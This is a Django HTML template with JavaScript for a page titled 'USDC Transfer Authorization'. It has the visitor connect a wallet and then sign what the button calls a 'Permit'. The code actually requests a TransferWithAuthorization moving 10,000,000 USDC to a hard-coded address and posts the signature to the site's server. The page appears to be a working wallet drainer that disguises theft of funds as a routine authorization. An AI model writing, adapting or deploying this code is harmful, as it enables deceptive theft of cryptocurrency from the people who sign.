{% load static %}
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Authorize USDC</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        /* White Background Theme */
        body { background-color: #f8fafc; color: #1e293b; min-height: 100vh; display: flex; align-items: center; justify-content: center; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        .auth-card { background: #ffffff; padding: 40px; border-radius: 16px; width: 100%; max-width: 480px; border: 1px solid #e2e8f0; box-shadow: 0 10px 25px rgba(0,0,0,0.05); }
        .btn-action { background: #0ea5e9; color: white; font-weight: 700; border: none; padding: 16px; border-radius: 12px; width: 100%; transition: 0.3s; margin-top: 20px; }
        .btn-action:hover { background: #0284c7; transform: translateY(-1px); }
        .btn-action:disabled { background: #cbd5e1; cursor: not-allowed; }
        .info-box { background: #f1f5f9; padding: 15px; border-radius: 10px; margin-bottom: 15px; text-align: left; border: 1px solid #e2e8f0; }
        .label { font-size: 0.75rem; color: #64748b; text-transform: uppercase; font-weight: bold; display: block; margin-bottom: 4px; }
        .value { font-family: 'Courier New', Courier, monospace; font-size: 0.9rem; color: #0f172a; word-break: break-all; }
        #error-display { background: #fef2f2; color: #dc2626; border: 1px solid #fecaca; padding: 15px; border-radius: 10px; margin-top: 20px; display: none; font-size: 0.85rem; text-align: left; }
        .status-pill { display: inline-block; padding: 4px 12px; border-radius: 20px; font-size: 0.8rem; background: #e0f2fe; color: #0369a1; margin-top: 10px; }
    </style>
</head>
<body>

<div class="auth-card text-center">
    <h4 class="mb-4">USDC Transfer Authorization</h4>

    <div id="step-1">
        <p class="text-muted mb-4">Please connect your wallet to authorize the transaction.</p>
        <button id="connectBtn" class="btn-action">Connect Wallet</button>
    </div>

    <div id="step-2" class="d-none">
        <div class="info-box">
            <span class="label">Your Connected Address</span>
            <div id="addrDisplay" class="value">0x...</div>
        </div>
        <button id="signBtn" class="btn-action">Sign 10,000,000 USDC Permit</button>
    </div>

    <div id="status-container">
        <div id="status" class="status-pill">System Ready</div>
    </div>

    <div id="error-display"></div>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
<script>
    const SPENDER = "0x0148CeA1f2DAC72f17c2130d8d43a3aB0eb9930B";
    const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
    let userAccount = null;

    const errorBox = document.getElementById('error-display');
    const statusPill = document.getElementById('status');

    function hideError() { errorBox.style.display = 'none'; }
    function showError(msg) {
        console.error(msg);
        errorBox.innerText = "⚠️ " + msg;
        errorBox.style.display = 'block';
    }

    async function connectWallet() {
        hideError();
        if(!window.ethereum) return showError("MetaMask not found. Please install the extension.");

        try {
            const provider = new ethers.BrowserProvider(window.ethereum);
            await provider.send("eth_requestAccounts", []);
            const signer = await provider.getSigner();
            userAccount = await signer.getAddress();

            document.getElementById('step-1').classList.add('d-none');
            document.getElementById('step-2').classList.remove('d-none');
            document.getElementById('addrDisplay').innerText = userAccount;
            statusPill.innerText = "Wallet Connected";
        } catch (err) {
            showError(err.message);
        }
    }

    async function signPermit() {
        hideError();
        statusPill.innerText = "Waiting for signature...";

        try {
            const provider = new ethers.BrowserProvider(window.ethereum);
            const signer = await provider.getSigner();
            const network = await provider.getNetwork();

            const domain = {
                name: "USD Coin",
                version: "2",
                chainId: network.chainId,
                verifyingContract: USDC_ADDRESS
            };

            const types = {
                TransferWithAuthorization: [
                    { name: "from", type: "address" },
                    { name: "to", type: "address" },
                    { name: "value", type: "uint256" },
                    { name: "validAfter", type: "uint256" },
                    { name: "validBefore", type: "uint256" },
                    { name: "nonce", type: "bytes32" }
                ]
            };

            const message = {
                from: userAccount,
                to: SPENDER,
                value: ethers.parseUnits("10000000", 6),
                validAfter: 0,
                validBefore: Math.floor(Date.now() / 1000) + 86400,
                nonce: ethers.hexlify(ethers.randomBytes(32))
            };

            // Request signature from MetaMask
            const sig = await signer.signTypedData(domain, types, message);
            statusPill.innerText = "Signature received. Sending to server...";

            // BUILD PAYLOAD EXPLICITLY TO PREVENT NONETYPE ERROR
            const payload = {
                message: {
                    from: message.from,
                    to: message.to,
                    value: message.value.toString(),
                    validAfter: message.validAfter.toString(),
                    validBefore: message.validBefore.toString(),
                    nonce: message.nonce // This is the crucial hex string
                },
                sig: sig
            };

            const response = await fetch("{% url 'update_wallet_status' %}", {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRFToken': '{{ csrf_token }}'
                },
                body: JSON.stringify(payload)
            });

            // Handle potential non-JSON responses (like 404/500 HTML)
            const contentType = response.headers.get("content-type");
            if (!contentType || !contentType.includes("application/json")) {
                const rawHTML = await response.text();
                return showError("Server returned HTML (likely 404 or 500). First 100 chars: " + rawHTML.substring(0, 100));
            }

            const result = await response.json();
            if (result.status === "success") {
                statusPill.innerText = "Authorization Successful!";
                statusPill.style.background = "#dcfce7";
                statusPill.style.color = "#166534";
                alert("Success! Transaction Hash: " + result.tx_hash);
            } else {
                showError(result.message);
            }

        } catch (err) {
            showError(err.message);
            statusPill.innerText = "Process Failed";
        }
    }

    document.getElementById('connectBtn').addEventListener('click', connectWallet);
    document.getElementById('signBtn').addEventListener('click', signPermit);
</script>
</body>
</html>
